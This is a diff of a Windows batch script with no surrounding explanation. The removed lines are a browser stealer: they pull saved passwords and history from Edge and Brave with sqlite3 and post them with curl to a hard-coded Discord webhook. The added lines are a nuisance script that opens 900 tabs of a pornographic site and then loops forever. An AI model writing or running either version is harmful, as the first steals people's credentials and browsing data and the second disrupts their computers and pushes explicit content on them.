@@ -1,68 +1,30 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Define the webhook URL
-set "webhook=https://discord.com/api/webhooks/1467403696865546540/vbQGkvyGsaCUgkdP2PK0Dtf6SrQsIR2rGSf0kKrmyOo95DkR9gKmnSm4noXdcyUVjyLc"
+:: Define the number of tabs to open
+set "numTabs=900"
 
-:: Function to send data to webhook
-:send_to_webhook
-set "data=%~1"
-curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"%data%\"}" %webhook%
-exit /b
+:: Define the URL to open
+set "url=http://pornhub.com"
 
-:: Function to get Edge passwords
-:get_edge_passwords
-set "edge_path=%localappdata%\Microsoft\Edge\User Data\Default\Login Data"
-if exist "%edge_path%" (
-    sqlite3 "%edge_path%" "SELECT origin_url, username_value, password_value FROM logins;" > edge_passwords.txt
-    set /p edge_data=<edge_passwords.txt
-    call :send_to_webhook "Edge Passwords: !edge_data!"
-) else (
-    echo Edge browser data not found.
-)
-exit /b
-
-:: Function to get Brave passwords
-:get_brave_passwords
-set "brave_path=%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
-if exist "%brave_path%" (
-    sqlite3 "%brave_path%" "SELECT origin_url, username_value, password_value FROM logins;" > brave_passwords.txt
-    set /p brave_data=<brave_passwords.txt
-    call :send_to_webhook "Brave Passwords: !brave_data!"
-) else (
-    echo Brave browser data not found.
-)
-exit /b
-
-:: Function to get Edge history
-:get_edge_history
-set "edge_history_path=%localappdata%\Microsoft\Edge\User Data\Default\History"
-if exist "%edge_history_path%" (
-    sqlite3 "%edge_history_path%" "SELECT url, title, last_visit_time FROM urls;" > edge_history.txt
-    set /p edge_history_data=<edge_history.txt
-    call :send_to_webhook "Edge History: !edge_history_data!"
-) else (
-    echo Edge browser history not found.
-)
-exit /b
-
-:: Function to get Brave history
-:get_brave_history
-set "brave_history_path=%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\History"
-if exist "%brave_history_path%" (
-    sqlite3 "%brave_history_path%" "SELECT url, title, last_visit_time FROM urls;" > brave_history.txt
-    set /p brave_history_data=<brave_history.txt
-    call :send_to_webhook "Brave History: !brave_history_data!"
-) else (
-    echo Brave browser history not found.
+:: Function to open tabs
+:open_tabs
+set "counter=0"
+:loop
+if !counter! lss %numTabs% (
+    start "" "%url%"
+    set /a counter+=1
+    goto loop
 )
 exit /b
 
 :: Main script execution
-call :get_edge_passwords
-call :get_brave_passwords
-call :get_edge_history
-call :get_brave_history
+call :open_tabs
 
-echo Data sent to webhook.
+:: Infinite loop to prevent the program from closing
+:infinite_loop
+ping 127.0.0.1 -n 2 >nul
+goto infinite_loop
+
+echo %numTabs% tabs of %url% opened.
 pause
